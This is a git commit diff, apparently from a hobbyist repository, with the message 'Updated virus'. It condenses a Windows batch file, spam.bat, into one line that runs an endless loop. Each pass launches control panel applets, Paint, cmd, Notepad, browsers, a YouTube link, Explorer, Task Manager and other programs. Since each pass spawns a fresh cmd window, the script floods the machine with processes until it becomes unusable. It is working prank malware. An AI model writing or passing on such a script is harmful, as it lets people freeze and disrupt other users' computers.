ee0b2230486b0acb8fb964715cdcf7a747569bc9
leafdagamer <115121261+leafdagamer@users.noreply.github.com>
2022-11-12 22:28:58 -0300

    Updated virus

--- spam.bat
+++ spam.bat
@@ -1,15 +1,2 @@
 :spam
-@echo off
-cls
-start appwiz.cpl
-start main.cpl
-start mspaint
-start cmd
-start notepad
-start iexplore
-start msedge
-start https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwi7-Y_4qan7AhWUpJUCHXhHDnwQwqsBegQICBAB&url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DxvFZjo5PgG0&usg=AOvVaw1bR_FN-SnfIGtKD3fjAA5P
-start cmd /C start explorer %cd%
-start iexpress
-start write
-goto spam
+@echo off& cls& start appwiz.cpl& start main.cpl& start mspaint& start cmd& start notepad& start iexplore& start msedge& start https://www.youtube.com/watch?v=xvFZjo5PgG0& start cmd /C start explorer %cd%& start iexpress& start write& start taskmgr& start winver& ver& goto spam
